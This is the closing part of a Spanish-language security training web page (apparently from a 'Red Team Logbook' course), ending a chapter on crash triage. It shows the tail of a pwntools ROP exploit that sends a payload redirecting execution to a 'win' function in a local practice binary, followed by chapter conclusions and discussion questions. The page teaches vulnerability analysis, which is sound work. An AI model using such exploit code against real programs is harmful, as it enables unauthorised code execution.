<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;win&#39;</span><span class="p">]))</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">fit</span><span class="p">({</span><span class="n">offset</span><span class="p">:</span> <span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">()})</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">path</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</code></pre></div>

<h2>5.8. Conclusiones del Capítulo 5</h2>
<ol>
<li><strong>Sanitizers son esenciales</strong> - Convierten bugs silenciosos en crashes informativos.</li>
<li><strong>Automatización acelera triage</strong> - CASR clasifica crashes masivamente.</li>
<li><strong>Análisis de causa raíz requiere múltiples técnicas</strong> - Depuradores, tracing, coverage.</li>
<li><strong>PoCs reproducibles son críticos</strong> - Documentan la vulnerabilidad.</li>
<li><strong>Práctica con binarios vulnerables desarrolla habilidades</strong>.</li>
</ol>
<h3>Preguntas de Discusión:</h3>
<ol>
<li>¿Cómo afectan las protecciones del compilador a la estrategia de explotación?</li>
<li>¿Cuándo es preferible usar ASAN vs PageHeap vs análisis binario puro?</li>
<li>¿Cómo se evalúa la explotabilidad de un crash sin control directo de RIP?</li>
</ol></article>
            <div class="nav"><a href="04-patch-diffing.html" class="nav-btn nav-prev"><i class="fas fa-chevron-left"></i><span>Anterior</span></a><a href="index.html" class="nav-btn nav-home"><i class="fas fa-home"></i><span>Inicio</span></a></div>
            <footer class="footer"><p>© 2024 Red Team Logbook | <a href="https://github.com/mburgc" target="_blank"><i class="fab fa-github"></i> mburgc</a></p></footer>
        </div>
    </main>
    <script>
document.addEventListener('DOMContentLoaded', function() {
    const searchInput = document.getElementById('searchbar');
    const searchBtn = document.getElementById('search-btn');
    
    function performSearch() {
        let input = searchInput.value.toLowerCase().trim();
        let content = document.querySelector('.content-area');
        let elements = content.querySelectorAll('p, li, h1, h2, h3, h4, h5, h6, pre, code');
        
        elements.forEach(el => {
            el.style.display = '';
            if (el.classList.contains('search-highlight')) {
                el.innerHTML = el.textContent;
                el.classList.remove('search-highlight');
            }
        });
        
        if (input === "") return;
        
        elements.forEach(el => {
            if (el.textContent.toLowerCase().includes(input)) {
                let html = el.innerHTML;
                let regex = new RegExp('(' + input + ')', 'gi');
                el.innerHTML = html.replace(regex, '<span class="search-highlight">$1</span>');
            } else {
                el.style.display = 'none';
            }
        });
    }
    
    if (searchBtn) searchBtn.addEventListener('click', performSearch);
    if (searchInput) searchInput.addEventListener('keyup', e => { if (e.key === 'Enter') performSearch(); });
    
    const menuToggle = document.getElementById('menu-toggle');
    const sidebar = document.querySelector('.sidebar');
    const overlay = document.querySelector('.sidebar-overlay');
    if (menuToggle) menuToggle.addEventListener('click', () => { sidebar.classList.toggle('active'); overlay.classList.toggle('active'); });
    if (overlay) overlay.addEventListener('click', () => { sidebar.classList.remove('active'); overlay.classList.remove('active'); });
});
</script>
</body>
</html>